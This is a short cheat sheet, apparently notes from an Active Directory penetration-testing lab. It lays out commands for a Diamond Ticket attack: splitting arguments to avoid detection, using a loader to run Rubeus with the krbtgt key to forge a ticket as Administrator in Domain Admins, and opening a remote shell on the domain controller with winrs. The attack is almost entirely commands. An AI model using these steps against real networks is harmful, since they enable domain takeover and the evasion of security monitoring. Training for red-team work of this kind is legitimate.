**Avoid detection in local machine (Run as Administrator):**
```
C:\Windows\system32>C:\AD\Tools\ArgSplit.bat 
[!] Argument Limit: 180 characters 
[+] Enter a string: diamond
```

**User Rubeus.exe to create a Diamond Ticket:**
```
Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /krbkey:krbtgt-hash /tgtdeleg /enctype:aes /ticketuser:Administrator /domain:dollarcorp.moneycorp.local /dc:corp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

/tgtdeleg - Rubeus will request a real TGT from DC.
/ticketuser:Administrator - Changing the user in the ticket to Administrator.
/ticketuserid:500 - RID Administrator.
/groups:512 - Adding the Domain Admins group.

**Access the DC using winrs from the new spawned process:**
```
winrs -r:corp-dc cmd
```
